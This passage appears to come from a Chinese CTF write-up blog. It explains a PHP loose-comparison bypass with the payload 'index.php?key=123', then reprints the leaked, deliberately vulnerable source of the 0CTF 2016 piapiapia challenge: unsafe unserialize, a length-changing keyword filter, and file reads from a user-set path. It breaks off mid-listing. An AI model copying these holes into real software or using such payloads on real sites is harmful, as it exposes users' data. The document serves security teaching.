<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>这里的是bak备份文件泄露，index.php.bak即可下载到源码<br>使用notepad打开<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        echo <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>分析代码可以知道，key参数以GET方式接受用户输入，利用了is_numeric来判断是否为数字，又利用了intval获取key的整数值</p>
<p>接下来看到str变量是123开头的一个字符串，str与key之间采用了==来进行判断，之前提到过===；</p>
<p>===和==个人理解下来就是前者为强判断，要求数据类型，长度和内容都要相同</p>
<p>PHP的弱类型特性==，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
<p>payload:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">index.php?<span class="type">key</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>直接得到flag</p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开之后是一个登录界面，尝试了一下sql注入发现有关键字被过滤了，之后又尝试了一下万能密码，同时对其进行了目录扫描，发现有www.zip的文件泄露，下载打开源码</p>
<p>index.php:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</span></span><br><span class="line"><span class="php">		header(<span class="string">'Location: profile.php'</span>);</span></span><br><span class="line"><span class="php">		<span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">		$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">		$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span></span><br><span class="line"><span class="php">			$_SESSION[<span class="string">'username'</span>] = $username;</span></span><br><span class="line"><span class="php">			header(<span class="string">'Location: profile.php'</span>);</span></span><br><span class="line"><span class="php">			<span class="keyword">exit</span>;	</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid user name or password'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>LOGIN<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>class.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">		$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			$config[<span class="string">'hostname'</span>],</span><br><span class="line">			$config[<span class="string">'username'</span>], </span><br><span class="line">			$config[<span class="string">'password'</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">		mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">		$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">		$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">		$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">		$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure></p>
<p>config.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span></span><br><span class="line"><span class="php">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">	$flag = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>profile.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	$username = $_SESSION[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">	$profile=$user-&gt;show_profile($username);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">		header(<span class="string">'Location: update.php'</span>);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">		$profile = unserialize($profile);</span></span><br><span class="line"><span class="php">		$phone = $profile[<span class="string">'phone'</span>];</span></span><br><span class="line"><span class="php">		$email = $profile[<span class="string">'email'</span>];</span></span><br><span class="line"><span class="php">		$nickname = $profile[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/gif;base64,&lt;?php echo $photo; ?&gt;"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hi <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span>&gt;</span>Phone: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span>&gt;</span>Email: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>register.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">		$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">		$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span></span><br><span class="line"><span class="php">			$user-&gt;register($username, $password);</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span>;		</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'User name Already Exists'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>REGISTER<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>update.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">		$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">		$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span></span><br><span class="line"><span class="php">			$user-&gt;register($username, $password);</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span>;		</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'User name Already Exists'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line">			<span 